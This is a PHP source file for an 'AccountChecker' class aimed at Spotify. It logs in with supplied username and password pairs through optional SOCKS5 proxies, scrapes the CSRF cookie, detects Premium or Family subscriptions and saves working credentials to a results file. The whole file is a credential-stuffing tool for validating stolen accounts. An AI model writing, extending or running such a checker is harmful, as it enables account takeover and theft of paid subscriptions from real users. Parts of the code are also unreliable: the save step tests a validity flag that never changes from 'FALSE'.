<?php

namespace Markoftw\AccountChecker;

use Markoftw\AccountChecker\Webrequests\Webrequests as Webrequests;
use Markoftw\AccountChecker\Functions\Functions as Functions;

class Spotify extends Webrequests
{
    private $_LOGIN_URL = "https://accounts.spotify.com/login";
    private $_LOGIN_API = "https://accounts.spotify.com/api/login";
    private $_LOGOUT_URL = "https://www.spotify.com/logout/";
    private $_LOGOUT_API = "https://accounts.spotify.com/api/logout";
    private $_PROFILE_URL = "https://www.spotify.com/account/overview/";

    private $_PROXY,
        $_TYPE,
        $_USERNAME,
        $_PASSWORD,
        $_FILE,
        $_VALID,
        $_PLAN,
        $_TIMER,
        $_RESULTS,
        $_PREMIUM;

    private static $_INSTANCE;
    private static $_SERVICE = "spotify";

    public function __construct()
    {
        self::$_INSTANCE = new Webrequests();
        $this->_VALID = "FALSE";
        $this->_RESULTS = [];
        $this->_TIMER = Functions::timer();
    }

    /**
     * Set curl proxy.
     *
     * @param $proxy
     * @param string $type
     * @return $this
     */
    public function proxy($proxy, $type = "SOCKS5")
    {
        $this->_PROXY = $proxy;
        $this->_TYPE = $type;
        $this->_RESULTS['PROXY'] = $proxy;
        $this->_RESULTS['TYPE'] = $type;
        return $this;
    }

    public function check($username, $password)
    {
        $this->_USERNAME = $username;
        $this->_PASSWORD = $password;
        $this->_RESULTS['USERNAME'] = $username;
        $this->_RESULTS['PASSWORD'] = $password;

        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGOUT_URL, $use_proxy, $proxy); // first we need to logout to clear cookies

        $login_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGIN_URL, $use_proxy, $proxy); // get csrf token from login page

        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $login_body, $match);

        $post_data = "remember=false&username=" . $username . "&password=" . $password . "&" . $match[1][0];

        echo $post_data;
        echo "<br>";
        echo "<br>";

        $post_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGIN_API, $use_proxy, $proxy, true, $post_data); // post email, pass, token

        echo $post_body;

        echo "<br>";
        echo "<br>";

        if (strpos($post_body, "displayName")) {
            $this->_RESULTS['VALID'] = "TRUE";
            $profile_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_PROFILE_URL, $use_proxy, $proxy);
            preg_match('/id="nav-link-upgrade" data-ga-category="menu" data-ga-action="([^"]*)">/', $profile_body, $matchPremium); //upgrade button
            if (empty($matchPremium)) {
                $this->_PREMIUM = "TRUE";
            }
        } else {
            $this->_RESULTS['VALID'] = $this->_VALID;
        }

        $this->_TIMER = round((Functions::timer() - $this->_TIMER), 4);
        $this->_RESULTS['LOADTIME'] = $this->_TIMER;

        return $this;
    }

    public function plan()
    {

        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        //usleep(500000); //0.5s

        if ($this->_PREMIUM == "TRUE") {
            $profile_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_PROFILE_URL, $use_proxy, $proxy);
            preg_match('/<svg><use xlink:href="#icon-checkmark"><\/use><\/svg><\/span>([^"]*)<\/h3><p class="subscription-status subscription-compact">/', $profile_body, $match);

            if ($match[1] == "Spotify Family") {
                $str = array("FAMILY" => "TRUE");
            } else {
                $str = array("PREMIUM" => "TRUE");
            }
            $this->_PLAN = $str;
            $this->_RESULTS['PLAN'] = $this->_PLAN;
        }

        return $this;

    }

    /**
     * Saving results to file.
     *
     * @param string $file
     * @return $this
     */
    public function save($file = "results_spotify.txt")
    {
        if (!file_exists($file) || !is_writable($file)) {
            echo '<br/>' . $file . ' missing or not writable.<br/>';
            exit;
        }
        $this->_FILE = $file;
        $this->_RESULTS['COMPLETED'] = $this->_FILE;

        if ($this->_VALID != "FALSE") {
            $write_file = fopen($this->_FILE, "w") or die("Unable to open file!");
            $txt = "SPOTIFY:" . $this->_USERNAME . ":" . $this->_PASSWORD . ":" . $this->_VALID . "\n";
            fwrite($write_file, $txt);
            fclose($write_file);
        }

        return $this;
    }

    /**
     * Return array.
     *
     * @return mixed
     */
    public function get()
    {
        return Functions::cleanKeys($this->_RESULTS);
    }

    /**
     * Return JSON.
     *
     * @return string
     */
    public function json()
    {
        return Functions::toJson(Functions::cleanKeys($this->_RESULTS));
    }

}
